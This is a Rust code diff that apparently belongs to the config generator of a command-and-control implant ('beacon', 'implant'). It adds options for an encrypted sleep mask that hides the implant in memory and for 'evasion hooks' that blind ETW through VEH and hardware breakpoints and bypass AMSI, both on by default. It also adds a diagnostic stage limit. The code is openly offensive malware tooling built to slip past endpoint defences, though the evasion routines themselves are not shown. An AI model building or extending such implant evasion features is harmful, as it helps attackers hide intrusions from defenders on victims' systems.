@@ -119,6 +119,17 @@ pub struct ConfigModel {
     /// its lifecycle to `specter.log` next to the implant. Off by default;
     /// every debug literal folds out of the blob under -Oz when false.
     pub debug: bool,
+    /// Encrypted sleep mask: the whole image is encrypted while the beacon
+    /// sleeps (the stub's own window stays plaintext). On by default; off =
+    /// plain indirect sleep (diagnostic/compat mode).
+    pub sleep_mask: bool,
+    /// Bootstrap stage limit (diagnostic): the beacon freezes in a spin
+    /// loop right after completing this many stages. Default: unlimited.
+    pub stages: u32,
+    /// Evasion hooks (ETW blinding VEH+HWBP, AMSI): off skips their
+    /// installation — a compatibility/diagnostic mode with a plain,
+    /// hook-free bootstrap.
+    pub hooks: bool,
     pub profile: ProfileModel,
 }
 
@@ -327,6 +338,15 @@ pub fn parse_config(json: &str) -> Result<ConfigModel, String> {
         watermark: u64_of(&v, "watermark")? as u32,
         kill_epoch: u64_of(&v, "kill_epoch")?,
         debug: v.get("debug").and_then(|b| b.as_bool()).unwrap_or(false),
+        sleep_mask: v
+            .get("sleep_mask")
+            .and_then(|b| b.as_bool())
+            .unwrap_or(true),
+        stages: v
+            .get("stages")
+            .and_then(|b| b.as_u64())
+            .unwrap_or(u32::MAX as u64) as u32,
+        hooks: v.get("hooks").and_then(|b| b.as_bool()).unwrap_or(true),
         profile: profile_of(field(&v, "profile")?)?,
     })
 }
@@ -496,12 +516,18 @@ pub fn render(model: &ConfigModel) -> String {
          pub const JITTER_MS: u32 = {jitter};\n\
          pub const WATERMARK: u32 = {wm};\n\
          pub const KILL_EPOCH: u64 = {kill};\n\
-         pub const DEBUG: bool = {dbg};\n\n",
+         pub const DEBUG: bool = {dbg};\n\
+         pub const SLEEP_MASK: bool = {mask};\n\
+         pub const HOOKS: bool = {hooks};\n\
+         pub const BOOTSTRAP_STAGES: u32 = {stages};\n\n",
         sleep = model.sleep_ms,
         jitter = model.jitter_ms,
         wm = model.watermark,
         kill = model.kill_epoch,
         dbg = model.debug,
+        mask = model.sleep_mask,
+        stages = model.stages,
+        hooks = model.hooks,
     ));
     out.push_str(&format!(
         "pub const ROTATION: Rotation = {rot};\n\
@@ -580,6 +606,9 @@ pub fn default_config_json() -> String {
         "watermark": 0,
         "kill_epoch": 0,
         "debug": false,
+        "sleep_mask": true,
+        "stages": 2147483647,
+        "hooks": true,
         "profile": model,
     });
     serde_json::to_string(&wrapper).expect("serializing default config")
